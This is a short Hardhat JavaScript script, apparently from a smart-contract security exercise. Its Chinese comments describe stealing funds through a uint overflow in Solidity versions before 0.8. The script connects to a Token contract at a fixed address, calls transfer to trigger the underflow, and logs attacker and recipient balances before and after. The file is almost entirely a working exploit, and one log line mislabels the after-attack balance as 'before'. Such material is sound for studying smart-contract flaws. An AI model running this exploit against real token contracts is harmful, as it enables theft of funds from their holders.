const { ethers } = require("hardhat");
/*
* 通过算术溢出增加资产
实现方式：solidity8.0之前版本可使用uint溢出漏洞，使计算出的值发生变化，以盗取资金
*/

async function CallHacker() {
    const TokenAddress = "0x18B95Bec6b7E928d7A8E1B83d9ACAFF1F7A0D0e4";
    const token = await ethers.getContractAt("Token", TokenAddress);
    const [hacker, addr1] = await ethers.getSigners();
    console.log(hacker.address);
    console.log(addr1.address);


    console.log("攻击前 hacker balance:", await token.balanceOf(hacker.address))
    console.log("攻击前 addr1 balance:", await token.balanceOf(addr1.address))
    
    // 开始攻击
    const tx = await token.transfer(addr1, 50);
    await tx.wait();

    console.log("攻击后 hacker balance:", await token.balanceOf(hacker.address))
    console.log("攻击前 addr1 balance:", await token.balanceOf(addr1.address))
}

CallHacker().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});